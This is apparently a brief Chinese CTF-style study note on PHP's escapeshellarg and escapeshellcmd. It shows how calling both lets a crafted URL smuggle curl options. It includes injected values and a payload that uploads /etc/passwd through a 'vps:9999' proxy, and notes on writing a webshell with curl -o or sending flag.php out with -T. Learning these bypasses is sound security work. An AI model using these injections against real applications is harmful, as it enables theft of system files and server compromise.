---
title: escapeshellarg&escapeshellcmd&curl
date: 2018-3-6 8:50:30
tags: Web安全
toc: true
---
parse_url()  处理url 各个部分为关联数组
strtolower()  转小写

### escapeshellarg() 
将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号
例如

		echo escapeshellarg("127.0.0.1' -T /etc/passwd");
		结果为 '127.0.0.1'\'' -T /etc/passwd' 
		先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用 

### escapeshellcmd() 
对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 
反斜线（\）会在以下字符之前插入： 
```
&#;`|*?~<>^()[]{}$\, \x0A 和 \xFF。
 ' 和 " 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。
```
例子

		$url = "127.0.0.1' -T /etc/passwd";
		escapeshellarg($url);
		escapeshellcmd($url);
		echo $url;
		运行后url为127.0.0.1\ -T /etc/passwd'
		escapeshellcmd('127.0.0.1'\'' -T /etc/passwd')对\转译后面多个',转义',即'172.17.0.2'\\'' -T /etc/passwd\'

curl -T /etc/passwd' url 时有‘ 不会成功读取passwd，so
mou表格姿势

		curl 'http://baidu.com/'\'' -F file=@/etc/passwd -x vps:9999'
		\是已被转义的 最后的' 对代理没影响 对curl版本有要求

#### curl

		curl -F 可以提交表单或文件
		curl -o 指定文件名写文件 可写shell
		curl -T 向服务器put文件  curl -T flag.php -x vps:port
